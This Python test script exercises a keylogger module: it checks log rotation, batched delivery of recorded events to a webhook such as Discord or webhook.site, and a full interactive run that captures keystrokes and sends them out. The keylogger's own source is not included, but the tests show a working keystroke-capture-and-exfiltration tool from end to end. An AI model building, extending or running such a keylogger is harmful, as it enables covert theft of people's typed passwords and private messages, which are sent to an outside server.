from keylogger import KeyloggerConfig, LogManager, WebHookDelivery, Keylogger


def test_log_manager_basic():
    print("\n=== TEST 1: LogManager basic ===")

    config = KeyloggerConfig()
    log_manager = LogManager(config)

    log_manager.log("test message 1")
    log_manager.log("test message 2")

    print(f"[OK] Log saved at: {log_manager.path}")
    print("Manually check the file to confirm both lines are there.")


def test_log_manager_rotation():
    print("\n=== TEST 2: LogManager rotation ===")

    # Very small log_size to force rotation quickly
    config = KeyloggerConfig(log_size=200)
    log_manager = LogManager(config)

    for i in range(20):
        log_manager.log(f"test message number {i} with extra text to take up space")

    print(f"[OK] Check the folder: {config.dir_path}")
    print("You should see the current 'keylogger.log' file, plus one or more")
    print("rotated files named like '[YYYYMMDD_HHMMSS]keylogger.log'.")


def test_webhook_automatic_batch():
    print("\n=== TEST 3: WebHookDelivery - automatic batch ===")

    # Replace this URL with your own (webhook.site or Discord)
    webhook_url = input("[*] Enter the webhook URL: ").strip()

    config = KeyloggerConfig(webhook_url=webhook_url, batch_size=3)
    webhook = WebHookDelivery(config)

    webhook.add_event("event 1")
    webhook.add_event("event 2")
    webhook.add_event("event 3")  # this should trigger delivery

    print("[OK] Check your webhook.site page or Discord channel.")
    print("A message should have arrived with: event 1 / event 2 / event 3")


def test_webhook_manual_flush():
    print("\n=== TEST 4: WebHookDelivery - manual flush ===")

    webhook_url = input("[*] Enter the webhook URL: ").strip()

    config = KeyloggerConfig(webhook_url=webhook_url, batch_size=10)
    webhook = WebHookDelivery(config)

    webhook.add_event("just one event, not reaching batch_size")
    webhook.flush()

    print("[OK] Check your webhook.site page or Discord channel.")
    print("The message should have arrived even though batch_size=10 wasn't reached.")


def test_webhook_no_url():
    print("\n=== TEST 5: WebHookDelivery without URL ===")

    config = KeyloggerConfig(webhook_url=None)
    webhook = WebHookDelivery(config)

    webhook.add_event("this should not be sent anywhere")
    webhook.flush()

    print("[OK] If you didn't see any error/exception above, the test passed.")


def test_full_keylogger():
    print("\n=== TEST 6: Full Keylogger (interactive) ===")
    print("Instructions:")
    print("  1. Type some regular keys.")
    print("  2. Press F9 to pause. Type something: it should NOT be saved.")
    print("  3. Press F9 again to resume.")
    print("  4. Keep typing until you reach 'batch_size' keys and check the webhook.")
    print("  5. Press Ctrl+C to stop and confirm the remaining buffer is sent.\n")

    webhook_url = input("[*] Enter the webhook URL: ").strip()

    config = KeyloggerConfig(webhook_url=webhook_url, batch_size=2)
    keylogger = Keylogger(config)

    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C detected, stopping...")
    finally:
        keylogger.end()
        print("[OK] Keylogger stopped. Check the log file and the webhook.")


if __name__ == "__main__":
    # test_log_manager_basic()
    # test_log_manager_rotation()
    # test_webhook_automatic_batch()
    # test_webhook_manual_flush()
    # test_webhook_no_url()
    test_full_keylogger()